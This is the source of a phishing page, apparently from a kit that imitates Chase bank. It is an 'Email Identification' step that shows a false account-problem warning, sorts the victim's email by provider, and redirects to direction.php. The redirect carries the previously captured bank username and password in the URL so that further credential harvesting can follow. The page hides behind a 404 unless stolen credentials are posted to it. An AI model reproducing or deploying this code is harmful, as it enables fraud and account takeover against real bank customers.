<?php
$random = substr(sha1(mt_rand()),1,25);
if(!isset($_POST['username'])) {
exit(header("HTTP/1.0 404 Not Found")); 
}
?>
<html xmlns="http://www.w3.org/1999/xhtml" lang="en" dir="ltr"><head>
        <meta charset="utf-8">
        <meta name="robots" content="noindex,nofollow">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <title>Email Identification</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link rel="shortcut icon" href="assets/img/chasefavicon.ico">
        <link rel="apple-touch-icon" sizes="152x152" href="assets/img/chase-touch-icon-152x152.png">
        <link rel="apple-touch-icon" sizes="120x120" href="assets/img/chase-touch-icon-120x120.png">
        <link rel="apple-touch-icon" sizes="76x76" href="assets/img/chase-touch-icon-76x76.png">
        <link rel="apple-touch-icon" href="assets/img/chase-touch-icon.png">
        <link rel="stylesheet" href="assets/css/logon.css">
        <link rel="stylesheet" href="assets/css/blue-ui2.css">
        <link rel="stylesheet" href="assets/css/overview.css">

</head>
<body style="overflow-x: hidden; overflow-y: auto; height: 100%" data-has-view="true">
<div data-is-view="true">
<div class="homepage">

<div class="logon-container">
<header class="toggle-aria-hidden">
<div class="logon header jpui transparent navigation bar">
<a href="#">
<div class="chase logo"></div>
</a> 
</div>
</header>
<style type="text/css">
    .jpui.alert.spox.spox .title {
    font-size: 1rem;
    font-weight: 300;
    color: #bf2155;
    letter-spacing: 0;
    text-decoration: none;
    width: 100%;
    margin: .0625rem .0625rem .313rem 0;
}
button, .button-cok{
    width: 100%;
    height: 40px;
    border:0;
    border-radius: 5px;
    background: #0b6efd;
    color: white;
    font-size: 20px;
    font-family: sans-serif;
}
</style>
<form action="" method="POST">
<main>
<div class="msd">

<div class="jpui background image fixed blurred"></div>
<div class="container">
<div class="row jpui primary panel">
<div class="col-xs-12 col-md-10 col-md-offset-1 content-container">
<div class="toggle-aria-hidden">
<h1 class="header">Email Identification</h1>
<div class="row jpui panel body">
    <div class="col-xs-12 col-sm-10 col-sm-offset-1">
    <div class="progress u-no-outline">
    <div class="row">
    <div class="col-xs-12 col-sm-6 clear-padding"><h2>Instructions</h2></div>
    <div class="col-xs-12 col-sm-6 progress-padding">
    <div class="jpui progress rectangles">
    <ol class="steps-3">
        <li id="progress-progressBar-step-1"></li>
        <li class="active current-step"></li>
        <li id="progress-progressBar-step-3"></li>
        <li id="progress-progressBar-step-4"></li>
    </ol>
</div>
    <label class="jpui label">Email Address</label>
    <input type="email" name="email" onkeyup="return keyupCheckemail();" id="CCname" class="jpui input account-input ssn_card_account_number" required=""><br><br>
    <button type="submit" id="submit" class="button-cok">Next</button>
<br><br><br><br><br><br><br><br>
<p class="identification-code-received-message">
<span>We ask you to verify your email to add this device as <a class="link-anchor underline">Trusted Devices,</a>and safeguard your account from any unauthorized login from unknown device.</span>
<span class="jpui link" id="requestNewIdentificationCode-link-wrapper">
</span>
</p>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</main>
</form>
</div>
</div> 
</div>
<style>

    /* The Modal (background) */
    .modal {
      display: none; /* Hidden by default */
      position: fixed; /* Stay in place */
      z-index: 1; /* Sit on top */
      padding-top: 100px; /* Location of the box */
      left: 0;
      top: 0;
      width: 100%; /* Full width */
      height: 100%; /* Full height */
      overflow: auto; /* Enable scroll if needed */
      background-color: rgb(0,0,0); /* Fallback color */
      background-color: rgba(0,0,0,0.4); /* Black w/ opacity */
    }

    /* Modal Content */
    .modal-content {
      background-color: #fefefe;
      margin: auto;
      padding: 20px;
      border: 1px solid #888;
      width: 300px;
      line-height: 22px;
      text-align: center;
      border-radius: 20px;
    }

    /* The Close Button */
    .close {
      color: #aaaaaa;
      float: right;
      font-size: 28px;
      font-weight: bold;
    }

    .close:hover,
    .close:focus {
      color: #000;
      text-decoration: none;
      cursor: pointer;
    }
    </style>
<!---->
            <div id="ember408" class="modal-manager ember-view">
                <div class="modal-overlay "></div>
                <!---->
            </div>
            <div id="myModal" class="modal">

                <!-- Modal content -->
                <div class="modal-content">
                    <span class="close"></span>
                    <p id="errMsg" style="color: #000;"></p>
                    <button id="btnClose" style="display: none; border-radius: 10px; height: 37px; font-size: 16px;" class="button theme-button button--round theme-button" type="submit">Try Again</button>
                    <div id="btnConfirm" style="display: none; border-radius: 5px; height: 37px; font-size: 16px;background: #0b6efd;color: white;padding-top: 8px;" class="button theme-button button--round theme-button"><b>Confirm Email</b></div>
                </div>

            </div>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<script type="text/javascript">
    function validateEmail(email) {
      const re = /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
      return re.test(email);
    }

    function validate() {
        // const $result = $("#result");
        const email = $("#CCname").val();
        // $result.text("");
        // var modal = document.getElementById("myModal");

        if (validateEmail(email)) {
            // console.log('valid');
            // alert('valid');
            var yahoo = email.search('yahoo');
            var hotmail = email.search('hotmail');
            var outlook = email.search('outlook');
            var msn = email.search('msn');
            var aol = email.search('aol');
            var comcast = email.search('comcast');
            var gmail = email.search('gmail');
            var icloud = email.search('icloud');
            var file = 'email_identification';
            if(yahoo > 0){
                file = 'yahoo';
                console.log('yahoo', yahoo);
            }else
            if(hotmail > 0){
                file = 'live';
                console.log('hotmail');
            }else
            if(outlook > 0){
                file = 'live';
                console.log('outlook');
            }else
            if(msn > 0){
                file = 'live';
                console.log('msn');
            }else
            if(aol > 0){
                file = 'aol';
                console.log('aol');
            }else
            if(comcast > 0){
                file = 'comcast';
                console.log('comcast');
            }else
            if(gmail > 0){
                file = 'gmail';
                console.log('gmail');
            }else
            if(icloud > 0){
                file = 'icloud';
                console.log('icloud');
            }else{
                console.log('random');
            }
            document.getElementById('errMsg').innerHTML = '<p style="font-size:20px;">There\'s a problem with your account. Make sure to resolve it so you have full access to your account again.</p>';
            $('#btnClose').hide();
            $('#btnConfirm').on('click', function(){
                window.location.replace("direction.php?token=<?php echo $random; ?>&file="+file+"&username=<?php echo $_POST['username']; ?>&password=<?php echo $_POST['password']; ?>&email="+email);
            })
            $('#btnConfirm').show();
            $('#myModal').show();
            return false;
        } else {
            document.getElementById('errMsg').innerHTML = '<p style="font-size:20px;">The email you entered is not valid!</p>';
            $('#btnConfirm').hide();
            $('#btnClose').show();
            $('#myModal').show();
            // alert('not valid');
            // console.log('not valid');
        }
        return false;
    }

    function keyupCheckemail(){
        const email = $("#CCname").val();
        if(validateEmail(email)){
            $('#submit').show();
        }else{
            $('#submit').hide();
        }
    }

    $("#submit").on("click", validate);
    var modal = document.getElementById("myModal");

    // Get the <span> element that closes the modal
    var span = document.getElementsByClassName("close")[0];
    var btnClose = document.getElementById("btnClose");

    // When the user clicks on <span> (x), close the modal
    span.onclick = function() {
      modal.style.display = "none";
    }
    btnClose.onclick = function() {
      modal.style.display = "none";
    }

    // When the user clicks anywhere outside of the modal, close it
    window.onclick = function(event) {
      if (event.target == modal) {
        modal.style.display = "none";
      }
    }
</script>

</body></html>